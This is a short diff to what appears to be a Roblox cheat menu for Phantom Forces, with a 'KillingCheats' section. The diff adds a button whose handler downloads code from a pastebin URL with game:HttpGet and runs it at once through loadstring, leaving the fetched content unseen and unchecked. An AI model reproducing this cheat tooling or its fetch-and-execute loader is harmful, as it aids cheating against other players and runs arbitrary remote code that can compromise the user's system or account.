@@ -112,3 +112,8 @@ local KillingCheats = PhantomForcesWindow:NewSection("create")
 KillingCheats:CreateButton("by Romd3907", function()
 print("HI")
 end)
+
+KillingCheats:CreateButton("next", function()
+loadstring(game:HttpGet('https://pastebin.com/raw/xLZaNJj7'))()
+print("HI")
+end)
